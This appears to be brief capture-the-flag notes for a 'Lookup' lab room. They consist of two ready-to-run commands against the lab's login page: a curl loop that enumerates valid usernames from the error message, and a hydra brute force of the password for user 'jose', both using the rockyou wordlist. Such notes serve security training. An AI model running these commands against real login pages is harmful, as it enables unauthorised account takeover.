# Lookup

to bruteforce usernames
`parallel --linebuffer -a rockyou.txt -j 5 'curl -s -m 10 -X POST -H "Connection: keep-alive" -H "User-Agent: Mozilla/5.0" -d "username={}&password=notapass" -i http://lookup.thm/login.php | grep -q "Wrong password. Please try again." && echo "VALID: {}"'`

to brute force password of **_`jose`_**
`hydra -l jose -P rockyou.txt lookup.thm http-post-form '/login.php:username=^USER^&password=^PASS^:F=Wrong password. Please try again.<br>Redirecting in 3 seconds.' -t 4 -V -f 2>&1 `
